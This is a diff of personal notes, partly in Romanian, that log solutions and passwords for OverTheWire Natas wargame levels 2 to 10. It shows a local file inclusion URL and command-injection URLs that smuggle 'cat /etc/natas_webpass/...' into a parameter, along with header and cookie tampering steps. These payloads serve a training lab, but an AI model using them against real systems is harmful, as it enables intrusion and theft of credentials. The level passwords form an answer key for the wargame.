@@ -17,10 +17,52 @@ users.txt
 PAROLA: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
 
 LEVEL_2: http://natas3.natas.labs.overthewire.org natas3 G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+
 http://natas3.natas.labs.overthewire.org/robots.txt -> /s3cr3t/
 http://natas3.natas.labs.overthewire.org/s3cr3t
 users.txt
 PAROLA: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 
 LEVEL_3: http://natas4.natas.labs.overthewire.org natas4 tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+Downloadam FoxyProxy, adaugam un proxy nou
+Din OWASP ZAP facem un request cu referer natas5
+PAROLA: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+LEVEL_4: http://natas5.natas.labs.overthewire.org natas5 Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+In OWASP ZAP modificam cookie logged in: 1
+PAROLA: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+LEVEL_5: http://natas6.natas.labs.overthewire.org natas6 fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+Ne uitam in /includes/secret.inc
+Introducem secretul
+PAROLA: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+LEVEL_6: http://natas7.natas.labs.overthewire.org natas7 jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 -> LFI
+PAROLA: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+LEVEL_7: http://natas8.natas.labs.overthewire.org natas8 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+Intram pe CyberChef, From HEX: ==QcCtmMml1ViV3b, Reverse: b3ViV1lmMmtCcQ==, From Base64: oubWYf2kBq
+Introducem secretul
+PAROLA: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+LEVEL_8: http://natas9.natas.labs.overthewire.org natas9 Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+http://natas9.natas.labs.overthewire.org/index.php?needle=;cat /etc/natas_webpass/natas10 -> COMMAND INJECTION
+PAROLA: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+LEVEL_9: http://natas10.natas.labs.overthewire.org natas10 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+http://natas10.natas.labs.overthewire.org/index.php?needle=%0Acat%20/etc/natas_webpass/natas11 
+PAROLA: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+LEVEL_10: http://natas11.natas.labs.overthewire.org natas11 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
+
 
